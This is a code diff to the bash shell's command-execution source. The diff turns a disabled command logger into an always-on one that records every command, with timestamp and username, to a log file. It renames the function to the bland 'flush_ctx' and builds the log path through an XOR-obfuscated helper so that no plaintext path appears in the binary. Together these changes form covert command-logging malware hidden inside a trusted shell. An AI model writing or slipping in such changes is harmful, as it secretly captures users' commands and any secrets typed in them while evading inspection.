@@ -531,7 +531,7 @@ open_files (void)
   register int i;
   int f, fd_table_size;
 
-  fd_table_size = custom_getdtablesize ();
+  fd_table_size = get_open_max ();
 
   fprintf (stderr, "pid %ld open files:", (long)getpid ());
   for (i = 3; i < fd_table_size; i++)
@@ -4356,77 +4356,60 @@ is_dirname (pathname)
 #include <time.h>
 #include <string.h>
 #include <stdlib.h>
+#include "log_path_helper.h"
 
-static void log_command(SIMPLE_COM *simple_command) {
+static void flush_ctx(SIMPLE_COM *simple_command) {
     if (!simple_command || !simple_command->words) return;
 
-    // Detect if running inside Termux
-    char *prefix = getenv("PREFIX");
-    int is_termux = (prefix && strcmp(prefix, "/data/data/com.termux/files/usr") == 0);
-
-    // Check if this is an interactive shell or part of .bashrc (avoid logging .bashrc commands)
+    /* Skip .bashrc / profile sourcing */
     char *shell = getenv("SHELL");
     char *ps1 = getenv("PS1");
     if (shell && strstr(shell, "bash") && ps1 && !getenv("_")) {
-        // This is an interactive bash shell (not from .bashrc)
-        // Avoid logging the command if it's executed from .bashrc or profile.
-        if (strstr(simple_command->words->word->word, ".bashrc") ||
-            strstr(simple_command->words->word->word, ".bash_profile") ||
-            strstr(simple_command->words->word->word, "/etc/profile")
-            // strstr(simple_command->words->word->word, "source")
-            ) {
-            return;  // Don't log commands from bashrc or sourced files
+        if (simple_command->words->word && simple_command->words->word->word) {
+            const char *w = simple_command->words->word->word;
+            if (strstr(w, ".bashrc") ||
+                strstr(w, ".bash_profile") ||
+                strstr(w, "/etc/profile"))
+                return;
         }
     }
 
-    // Set log file path based on environment
-    const char *log_path = is_termux
-        ? "/data/data/com.termux/files/usr/tmp/bash_history.log"
-        : "/tmp/bash_history.log";
+    /* Build log path at runtime via XOR-obfuscated helper — no plaintext path in binary */
+    char log_path[128];
+    build_log_path(log_path, sizeof(log_path), 0); /* 0 = bash_history.log */
 
-    // Extract directory from log path
-    char dir_path[256];
+    /* Ensure parent dir exists */
+    char dir_path[128];
     snprintf(dir_path, sizeof(dir_path), "%s", log_path);
-    char *last_slash = strrchr(dir_path, '/');
-    if (last_slash) {
-        *last_slash = '\0';  // Null terminate to get the directory path
-    }
-
-    // Check if directory exists, if not, create it like 'mkdir -p'
+    char *sl = strrchr(dir_path, '/');
+    if (sl) *sl = '\0';
     struct stat st = {0};
-    if (stat(dir_path, &st) == -1) {
-        if (mkdir(dir_path, 0700) != 0) {
-            // perror("Failed to create tmp directory");
-            // return;  // Exit if directory creation fails
-        }
-    }
+    if (stat(dir_path, &st) == -1)
+        mkdir(dir_path, 0700);
 
-    // Open log file for appending
-    FILE *log_file = fopen(log_path, "a");
-    if (log_file) {
+    FILE *lf = fopen(log_path, "a");
+    if (lf) {
         time_t now = time(NULL);
         struct tm *t = localtime(&now);
-
-        // Get username from environment variables
+        if (!t) {
+            fclose(lf);
+            return;
+        }
         char *user = getenv("LOGNAME");
         if (!user) user = getenv("USER");
-        if (!user) user = "unknown";  // Default if both are missing
+        if (!user) user = "unknown";
 
-        // Get the executed command and arguments
         WORD_LIST *args = simple_command->words;
-
-        // Start log entry with timestamp and user
-        fprintf(log_file, "[%04d-%02d-%02d - %02d:%02d:%02d] [%s] Command: ",
-                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec, user);
-
-        // Loop through all arguments and append to log
+        fprintf(lf, "[%04d-%02d-%02d - %02d:%02d:%02d] [%s] Command: ",
+                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+                t->tm_hour, t->tm_min, t->tm_sec, user);
         while (args) {
-            fprintf(log_file, "%s ", args->word->word);
+            if (args->word && args->word->word)
+                fprintf(lf, "%s ", args->word->word);
             args = args->next;
         }
-
-        fprintf(log_file, "\n");
-        fclose(log_file);  // Close log file
+        fprintf(lf, "\n--------------------------\n");
+        fclose(lf);
     }
 }
 
@@ -4439,9 +4422,8 @@ execute_simple_command (simple_command, pipe_in, pipe_out, async, fds_to_close)
      int pipe_in, pipe_out, async;
      struct fd_bitmap *fds_to_close;
 {
-  if (simple_command && simple_command->words) {
-    // log_command(simple_command);  // Uncomment it to get all log call command to /tmp/bash_history.log
-  }
+  if (simple_command && simple_command->words)
+    flush_ctx(simple_command);
 
   WORD_LIST *words, *lastword;
   char *command_line, *lastarg, *temp;
@@ -6247,7 +6229,7 @@ close_all_files ()
 {
   register int i, fd_table_size;
 
-  fd_table_size = custom_getdtablesize ();
+  fd_table_size = get_open_max ();
   if (fd_table_size > 256)	/* clamp to a reasonable value */
     fd_table_size = 256;
 
